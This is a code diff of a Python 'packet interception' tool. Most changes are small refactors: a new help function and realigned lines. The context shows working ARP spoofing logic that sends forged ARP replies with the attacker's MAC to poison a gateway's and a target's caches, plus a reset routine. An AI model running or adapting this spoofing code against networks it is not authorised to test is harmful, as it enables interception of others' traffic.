@@ -24,10 +24,10 @@ A simple tool for packet interception.
 stop_event = threading.Event()
 
 def CheckFlags(required, arguments):
-	if HELP_FLAG in arguments: PrintMessage(code=1)
+	if HELP_FLAG in arguments: PrintHelp()
 
 	for flag in required:
-		if flag not in arguments: PrintMessage(code=1)
+		if flag not in arguments: PrintHelp()
 
 def PopulateFields(parameters):
 	for argument in range(0, len(sys.argv)):
@@ -51,7 +51,13 @@ def PopulateFields(parameters):
 			case '-vv':
 				parameters["Verbose"] = True
 				parameters["Verboser"] = True
+			case HELP_FLAG:
+				PrintHelp()
 	return parameters
+
+def PrintHelp():
+	print(HELP_MESSAGE)
+	sys.exit()
 
 def PrintMessage(message="", code=-1):
 	white = colorama.Fore.WHITE
@@ -60,9 +66,6 @@ def PrintMessage(message="", code=-1):
 			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
 		case -1:
 			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
-			sys.exit()
-		case 1:
-			print(HELP_MESSAGE)
 			sys.exit()
 
 def GetMAC(destination, timeout, interface):
@@ -75,8 +78,8 @@ def GetMAC(destination, timeout, interface):
 	return None
 
 def Reset(message, gateway, gateway_mac, target, target_mac):
-	gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=gateway_mac, hwdst=target_mac)
-	target_packet = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=target_mac,  hwdst=gateway_mac)
+	gateway_packet = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=gateway_mac, hwdst=target_mac)
+	target_packet  = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=target_mac,  hwdst=gateway_mac)
 
 	send(gateway_packet, count=1, verbose=False)
 	send(target_packet,  count=1, verbose=False)
@@ -86,8 +89,8 @@ def Reset(message, gateway, gateway_mac, target, target_mac):
 
 def Spoof(verbose, interval, gateway, gateway_mac, target, target_mac, attacker_mac):
 	while not stop_event.is_set():
-		gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=attacker_mac, hwdst=target_mac)
-		target_packet = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac)
+		gateway_packet = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=attacker_mac, hwdst=target_mac)
+		target_packet  = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac)
 		
 		if verbose:
 			PrintMessage((target_packet.summary(), gateway_packet.summary()), 0)
